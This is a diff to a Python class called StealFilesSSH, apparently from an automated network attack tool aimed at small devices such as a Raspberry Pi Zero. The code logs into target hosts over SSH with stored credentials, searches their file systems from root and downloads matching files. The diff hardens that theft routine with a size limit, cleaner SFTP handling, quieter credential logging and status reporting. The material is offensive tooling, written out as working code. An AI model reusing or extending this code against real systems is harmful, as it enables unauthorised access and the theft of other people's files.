@@ -218,23 +218,41 @@ class StealFilesSSH:
         logger.info(f"Found {len(matches)} matching files in {dir_path}")
         return matches
 
+    # Max file size to download (10 MB) — protects RPi Zero RAM
+    _MAX_FILE_SIZE = 10 * 1024 * 1024
+
     def steal_file(self, ssh: paramiko.SSHClient, remote_file: str, local_dir: str) -> None:
         """
         Download a single remote file into the given local dir, preserving subdirs.
+        Skips files larger than _MAX_FILE_SIZE to protect RPi Zero memory.
         """
         sftp = ssh.open_sftp()
         self.sftp_connected = True  # first time we open SFTP, mark as connected
 
-        # Preserve partial directory structure under local_dir
-        remote_dir = os.path.dirname(remote_file)
-        local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
-        os.makedirs(local_file_dir, exist_ok=True)
+        try:
+            # Check file size before downloading
+            try:
+                st = sftp.stat(remote_file)
+                if st.st_size and st.st_size > self._MAX_FILE_SIZE:
+                    logger.info(f"Skipping {remote_file} ({st.st_size} bytes > {self._MAX_FILE_SIZE} limit)")
+                    return
+            except Exception:
+                pass  # stat failed, try download anyway
 
-        local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
-        sftp.get(remote_file, local_file_path)
-        sftp.close()
+            # Preserve partial directory structure under local_dir
+            remote_dir = os.path.dirname(remote_file)
+            local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
+            os.makedirs(local_file_dir, exist_ok=True)
 
-        logger.success(f"Downloaded: {remote_file}  ->  {local_file_path}")
+            local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
+            sftp.get(remote_file, local_file_path)
+
+            logger.success(f"Downloaded: {remote_file}  ->  {local_file_path}")
+        finally:
+            try:
+                sftp.close()
+            except Exception:
+                pass
 
     # --------------------- Orchestrator entrypoint ---------------------
 
@@ -247,6 +265,7 @@ class StealFilesSSH:
           - status_key: action name (b_class)
         Returns 'success' if at least one file stolen; else 'failed'.
         """
+        timer = None
         try:
             self.shared_data.bjorn_orch_status = b_class
 
@@ -255,6 +274,9 @@ class StealFilesSSH:
                 port_i = int(port)
             except Exception:
                 port_i = b_port
+
+            hostname = self.hostname_for_ip(ip) or ""
+            self.shared_data.comment_params = {"ip": ip, "port": str(port_i), "hostname": hostname}
 
             creds = self._get_creds_for_target(ip, port_i)
             logger.info(f"Found {len(creds)} SSH credentials in DB for {ip}")
@@ -283,12 +305,14 @@ class StealFilesSSH:
                     break
 
                 try:
-                    logger.info(f"Trying credential {username}:{password} for {ip}")
+                    self.shared_data.comment_params = {"user": username, "ip": ip, "port": str(port_i), "hostname": hostname}
+                    logger.info(f"Trying credential {username} for {ip}")
                     ssh = self.connect_ssh(ip, username, password, port=port_i)
                     # Search from root; filtered by config
                     files = self.find_files(ssh, '/')
 
                     if files:
+                        self.shared_data.comment_params = {"user": username, "ip": ip, "port": str(port_i), "hostname": hostname, "files": str(len(files))}
                         for remote in files:
                             if self.stop_execution or self.shared_data.orchestrator_should_exit:
                                 logger.info("Execution interrupted during download.")
@@ -310,12 +334,14 @@ class StealFilesSSH:
                     # Stay quiet on Paramiko internals; just log the reason and try next cred
                     logger.error(f"SSH loot attempt failed on {ip} with {username}: {e}")
 
-            timer.cancel()
             return 'success' if success_any else 'failed'
 
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
             return 'failed'
+        finally:
+            if timer:
+                timer.cancel()
 
 
 if __name__ == "__main__":
